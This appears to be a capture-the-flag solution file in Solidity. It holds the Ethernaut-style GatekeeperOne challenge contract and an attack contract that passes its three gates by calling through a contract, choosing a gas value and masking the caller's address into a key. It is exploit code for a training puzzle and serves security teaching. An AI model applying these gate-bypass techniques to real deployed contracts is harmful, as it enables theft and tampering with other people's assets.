pragma solidity ^0.6.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

 modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract AttackGatekeeper {
    address gatekeeperAddress = YOUR_INSTANCE_ADDRESS;
    GatekeeperOne gatekeeperContract = GatekeeperOne(gatekeeperAddress);
    
    address transactionOrigin = tx.origin;
    bytes8 lastEightBytesTxOrigin = bytes8(uint64(transactionOrigin));
    bytes8 mask = 0xF00000000000FFFF;
    bytes8 key = lastEightBytesTxOrigin & mask;
    bytes4 functionSelector = bytes4(keccak256("enter(bytes8)"));

    function pwn() public {
        bytes memory arguments = abi.encodeWithSelector(functionSelector, key);
        address(gatekeeperContract).call.gas(YOUR_GAS_VALUE)(arguments);
    }
} 
